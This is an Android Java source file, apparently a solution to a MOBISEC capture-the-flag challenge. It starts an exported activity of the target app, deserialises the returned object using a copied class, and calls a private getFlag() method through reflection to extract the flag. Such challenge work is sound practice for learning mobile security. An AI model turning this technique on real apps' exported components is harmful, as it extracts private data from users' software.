package org.naija.serialclient;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import com.mobisec.serialintent.FlagContainer;

import java.lang.reflect.Method;

/**
 * Challenge 06: Serial Intent.
 *
 * Exploit: com.mobisec.serialintent.SerialActivity is exported and returns
 * a Serializable FlagContainer object as a result extra. Deserializing a
 * Serializable requires the exact class on our classpath, so this project
 * bundles a copy of com.mobisec.serialintent.FlagContainer (matching
 * signature/serialVersionUID) purely so Intent.getSerializableExtra() can
 * reconstruct it. FlagContainer.getFlag() is a private instance method -
 * private is a compile-time/access-control concept only, not a security
 * boundary at the bytecode level - so we call it via reflection after
 * setAccessible(true).
 */
public class MainActivity extends Activity {
    private static final String TAG = "MOBISEC";
    private static final int REQ = 1;

    private TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        tv = new TextView(this);
        tv.setText("waiting for flag...");
        setContentView(tv);

        Intent i = new Intent();
        i.setComponent(new ComponentName("com.mobisec.serialintent",
                "com.mobisec.serialintent.SerialActivity"));
        startActivityForResult(i, REQ);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != REQ || data == null) {
            Log.e(TAG, "no result, code=" + resultCode);
            return;
        }
        try {
            FlagContainer fc = (FlagContainer) data.getSerializableExtra("flag");
            // getFlag() is private in the target's class, so call it reflectively.
            Method m = FlagContainer.class.getDeclaredMethod("getFlag");
            m.setAccessible(true);
            String flag = (String) m.invoke(fc);
            Log.e(TAG, "FLAG: " + flag);
            tv.setText(flag);
        } catch (Exception e) {
            Log.e(TAG, "failed to read flag", e);
        }
    }
}
